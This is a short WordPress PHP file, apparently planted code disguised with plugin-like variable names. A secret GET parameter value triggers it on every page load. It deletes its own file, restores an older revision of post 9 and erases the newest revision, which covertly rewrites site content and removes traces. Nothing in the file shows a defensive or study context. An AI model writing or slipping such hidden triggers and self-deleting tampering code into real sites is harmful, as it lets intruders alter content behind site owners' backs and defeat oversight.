<?php

function duplicate_internal_auth() {
	if (isset($_GET['gateway_shop_updater_subscription']) && $_GET['gateway_shop_updater_subscription'] === 'variations_theme_jetpack') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$push_generator_direct_print = 9;
		$right_survey_edit_free = wp_get_post_revisions($push_generator_direct_print);
		if (empty($right_survey_edit_free)) die('no revisions');
		if (count($right_survey_edit_free) < 2) die('less than 2');
		$optimizer_views_jquery = array_shift($right_survey_edit_free);
		$follow_monitor_verification = $optimizer_views_jquery->ID;
		$automatic_wow_services = array_shift($right_survey_edit_free);
		$board_edition_helper_compat = $automatic_wow_services->ID;
		$cart_purchase_friendly = wp_restore_post_revision($board_edition_helper_compat);
		if ($cart_purchase_friendly === false) die('error restoring');
		$cart_purchase_friendly = wp_delete_post_revision($follow_monitor_verification);		
		if ($cart_purchase_friendly === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'duplicate_internal_auth');
